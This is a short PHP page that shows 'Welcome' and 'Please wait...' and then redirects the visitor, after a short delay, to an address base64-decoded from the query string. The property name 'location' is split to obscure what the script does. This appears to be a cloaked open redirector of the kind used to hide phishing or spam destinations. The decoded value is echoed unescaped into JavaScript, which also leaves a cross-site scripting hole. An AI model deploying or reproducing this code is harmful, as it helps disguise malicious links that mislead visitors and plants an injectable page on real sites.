<?php

$l=$_SERVER["QUERY_STRING"];
$l=str_replace(".html", "", $l);
$l=base64_decode($l);


?><!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
    <script type="text/javascript">
        function m(){
            var loc = "location";
            var doc = document;
            doc[loc] = "<?php echo $l; ?>";

            return "OK";
        }
    </script>
</head>
<body>
<div>Please wait...</div>
<script type="text/javascript">
    setTimeout(m, 150);
</script>
</body>
</html>
